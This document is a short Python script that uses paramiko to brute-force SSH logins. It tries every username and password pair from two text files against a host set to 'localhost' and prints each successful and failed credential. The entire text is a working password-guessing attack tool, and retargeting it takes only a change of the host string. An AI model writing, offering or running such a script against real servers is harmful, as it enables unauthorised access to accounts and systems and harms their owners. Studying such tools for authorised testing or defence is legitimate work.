import paramiko

# Set the remote host
remote_host = 'localhost'

# Read the list of users from the users.txt file
with open('users.txt', 'r') as f:
    users = f.read().splitlines()

# Read the list of passwords from the passwords.txt file
with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()

# Try each combination of user and password
for user in users:
    for password in passwords:
        try:
            # Connect to the remote host using SSH
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(remote_host, username=user, password=password)

            # If the login is successful, print a message and break out of the loop
            print(f'Login successful: user={user}, password={password}')
            break
        except Exception as e:
            # If the login is unsuccessful, print an error message
            print(f'Login failed: user={user}, password={password}')

# Close the SSH connection
ssh.close()



